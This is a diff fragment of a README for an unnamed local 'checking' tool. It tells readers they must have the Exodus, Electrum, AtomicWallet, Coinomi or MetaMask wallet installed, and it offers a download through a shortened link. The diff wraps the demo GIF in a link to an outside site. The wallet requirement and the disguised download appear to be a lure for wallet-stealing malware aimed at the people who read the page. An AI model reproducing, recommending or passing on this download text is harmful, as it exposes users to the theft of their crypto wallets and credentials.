@@ -4,7 +4,9 @@ It does not depend on an online API. Checks through your local. <br />
 To avoid any restrictions (or shadow bans), you must have one of the "Exodus", "Electrum", "AtomicWallet", "Coinomi" wallets installed on your computer or "MetaMask" extension installed on your browser. <br />
 
 # Usage Video;
-<img src="https://s6.gifyu.com/images/S8ckO.gif">
+<a target="_blank" href="https://www.badbull.pro/">
+ <img src="https://s6.gifyu.com/images/S8ckO.gif">
+</a>
 
 # Download
 Link : https://cutt.ly/bwRhFObY <br />
